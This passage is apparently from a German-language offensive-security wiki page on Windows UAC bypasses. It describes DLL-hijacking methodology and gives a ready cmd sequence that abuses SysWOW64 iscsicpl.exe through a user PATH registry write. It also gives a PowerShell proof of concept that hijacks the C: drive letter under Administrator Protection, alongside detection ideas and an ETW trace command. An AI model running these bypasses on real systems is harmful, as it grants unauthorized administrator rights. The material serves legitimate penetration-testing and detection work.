Wenn Lärm kein Problem ist, kann ein Tool wie [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) wiederholt eine Rechteerweiterung anfordern, bis der Benutzer sie akzeptiert.

### Eigener Bypass – grundlegende UAC-Bypass-Methodik

Wenn du dir **UACME** ansiehst, wirst du feststellen, dass **viele UAC-Bypässe DLL Hijacking ausnutzen** (häufig, indem eine erhöhte Binärdatei eine vom Angreifer kontrollierte DLL aus einem beschreibbaren Pfad lädt). [Lies hier, wie du eine DLL-Hijacking-Schwachstelle findest](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Finde eine Binärdatei, die **automatisch erhöhte Rechte erhält** (prüfe, ob sie bei der Ausführung mit einem hohen Integritätslevel läuft).
2. Suche mit ProcMon nach "**NAME NOT FOUND**"-Ereignissen, die für **DLL Hijacking** anfällig sein könnten.
3. Wahrscheinlich musst du die DLL in einen **geschützten Pfad** (wie `C:\Windows\System32`) **schreiben**, für den du keine Schreibberechtigungen hast. Das kannst du umgehen mit:
   1. **wusa.exe**: Windows 7, 8 und 8.1. Damit lässt sich der Inhalt einer CAB-Datei in geschützte Pfade extrahieren (da dieses Tool mit einem hohen Integritätslevel ausgeführt wird).
   2. **IFileOperation**: Windows 10.
4. Erstelle ein **Skript**, das deine DLL in den geschützten Pfad kopiert und die anfällige Binärdatei mit automatischer Rechteerhöhung ausführt.

### Eine weitere UAC-Bypass-Technik

Dabei wird beobachtet, ob eine **autoElevated-Binärdatei** versucht, den **Namen/Pfad** einer auszuführenden **Binärdatei** oder eines **Befehls** aus der **Registry** zu **lesen** (besonders interessant ist es, wenn die Binärdatei diese Informationen in **HKCU** sucht).

### UAC-Bypass über `SysWOW64\iscsicpl.exe` + DLL Hijacking über den Benutzer-`PATH`

Die 32-Bit-Datei `C:\Windows\SysWOW64\iscsicpl.exe` ist eine Binärdatei mit **automatischer Rechteerhöhung**, die sich ausnutzen lässt, um `iscsiexe.dll` anhand der Suchreihenfolge zu laden. Wenn du eine bösartige `iscsiexe.dll` in einem **vom Benutzer beschreibbaren** Ordner ablegen und anschließend den `PATH` des aktuellen Benutzers ändern kannst (zum Beispiel über `HKCU\Environment\Path`), sodass dieser Ordner durchsucht wird, lädt Windows möglicherweise die Angreifer-DLL in den erhöhten `iscsicpl.exe`-Prozess, **ohne eine UAC-Abfrage anzuzeigen**.<sup>[[1]](#references)[[6]](#references)</sup>

Praktische Hinweise:
- Das ist nützlich, wenn der aktuelle Benutzer Mitglied der Gruppe **Administrators** ist, aber aufgrund von UAC mit **Medium Integrity** läuft.
- Für diesen Bypass ist die Kopie unter **SysWOW64** relevant. Behandle die Kopie unter **System32** als separate Binärdatei und überprüfe ihr Verhalten unabhängig.
- Die Methode kombiniert **automatische Rechteerhöhung** mit **DLL-Suchreihenfolgen-Hijacking**. Daher eignet sich derselbe ProcMon-Ablauf wie bei anderen UAC-Bypässen, um das Laden der fehlenden DLL zu überprüfen.

Minimaler Ablauf:

```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```

Erkennungsideen:
- Auf `reg add` / Registry-Schreibvorgänge in `HKCU\Environment\Path` achten, auf die unmittelbar die Ausführung von `C:\Windows\SysWOW64\iscsicpl.exe` folgt.
- Nach `iscsiexe.dll` an **benutzergesteuerten** Speicherorten wie `%TEMP%` oder `%LOCALAPPDATA%\Microsoft\WindowsApps` suchen.
- Starts von `iscsicpl.exe` mit unerwarteten untergeordneten Prozessen oder DLL-Ladevorgängen außerhalb der üblichen Windows-Verzeichnisse korrelieren.

### Neuere Forschung, die separat geprüft werden sollte

Einige Angriffsketten aus der Forschung nach 2024 ähneln nicht mehr den klassischen Registry-Hijacks unter `HKCU\Software\Classes`. So können beispielsweise Activation-Context-Cache-Poisoning, ein **Drive Remap** und **DLL Redirection** kombiniert werden, um über vertrauenswürdige UI- bzw. automatisch erhöhte Binärdateien wie `ctfmon.exe` und spätere Ziele wie `fodhelper.exe` von mittlerer auf hohe Integrität zu wechseln. Statt das umfangreiche PoC hier zu duplizieren, sieh dir die kompakten Payload-Beispiele unter folgendem Link an:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (Vorschau): Hijacking von Laufwerksbuchstaben über die DOS-Gerätezuordnung pro Anmeldesitzung

> [!NOTE]
> Stand August 2026 dokumentiert Microsoft Administrator Protection weiterhin als **Insider-Vorschau**: Die Einführung im Oktober 2025 wurde zurückgenommen und ist für einen späteren Zeitpunkt geplant. Prüfe vor dem Testen dieser Angriffsketten, ob **Admin Approval Mode with Administrator protection** tatsächlich aktiviert ist und das Gerät neu gestartet wurde. Eine unveränderte Versionszeichenfolge für 25H2 allein beweist nicht, dass die Funktion aktiv ist.<sup>[[10]](#references)</sup>

Die spezielle Seite zur gesamten Angriffsfläche von `RAiLaunchAdminProcess` / UIAccess auf Windows-11-25H2-Vorschauversionen findest du hier:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 „Administrator Protection“ verwendet Shadow-Admin-Token mit sitzungsspezifischen `\Sessions\0\DosDevices/<LUID>`-Zuordnungen. Das Verzeichnis wird beim ersten Auflösen von `\??` verzögert durch `SeGetTokenDeviceMap` erstellt. Wenn der Angreifer das Shadow-Admin-Token nur mit **SecurityIdentification** imitiert, wird das Verzeichnis mit dem Angreifer als **Besitzer** erstellt (es erbt `CREATOR OWNER`). Dadurch können Laufwerksbuchstaben-Verknüpfungen angelegt werden, die Vorrang vor `\GLOBAL??` haben.<sup>[[7]](#references)</sup>

**Schritte:**

1. Rufe in einer Sitzung mit geringen Berechtigungen `RAiProcessRunOnce` auf, um ein Shadow-Admin-`runonce.exe` ohne Eingabeaufforderung zu starten.
2. Dupliziere dessen primäres Token als **Identification**-Token und imitiere es, während du `\??` öffnest, um die Erstellung von `\Sessions\0\DosDevices/<LUID>` unter dem Besitz des Angreifers zu erzwingen.
3. Erstelle dort einen `C:`-Symlink, der auf vom Angreifer kontrollierten Speicher verweist. Nachfolgende Dateisystemzugriffe in dieser Sitzung lösen `C:` zum Angreiferpfad auf und ermöglichen so DLL- bzw. Datei-Hijacking ohne Eingabeaufforderung.

**PowerShell-PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```

Auf Preview-Hosts protokolliert Administrator Protection Genehmigungen und Fehlschläge als ETW-Ereignisse **15031** und **15032** unter dem Provider `Microsoft-Windows-LUA`. Die Ereignisse enthalten die SID des Anforderers, den Anwendungspfad, das Ergebnis, das verwaltete Administratorkonto und die Authentifizierungsmethode. Wiederholte Exploit-Versuche oder fehlgeschlagene UI-Steuerung bleiben also nicht ohne Telemetrie.<sup>[[10]](#references)</sup>

```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```



## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – So funktioniert die Benutzerkontensteuerung](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Sammlung von UAC-bypass-Techniken](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Kompatibilitätsscanner und Launcher für UAC-bypass](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI nutzt KI zur Erstellung von PowerShell-Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: Ausnutzung einer 0-Day-Schwachstelle gegen Regierungsziele in Südostasien](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Umgehung des Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – UAC-bypass mithilfe der SilentCleanup-Aufgabe](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – Umgehungen von UnifiedConsent, TabTip und Narrator mit Always Notify](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Administratorschutz](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – Aufruf lokaler Windows-RPC-Server aus .NET](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte erweitert CoolClient um ein signiertes Windows-Kernel-Rootkit](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
- [13] [Group-IB – KGB RAT: Ein vollständig unerkennbarer Windows-Trojaner zum Ausspionieren, Stehlen und Terrorisieren](https://www.group-ib.com/blog/kgb-rat-windows-fud-trojan/)
- [14] [LOLBAS – ComputerDefaults.exe](https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/)
{{#include ../../banners/hacktricks-training.md}}
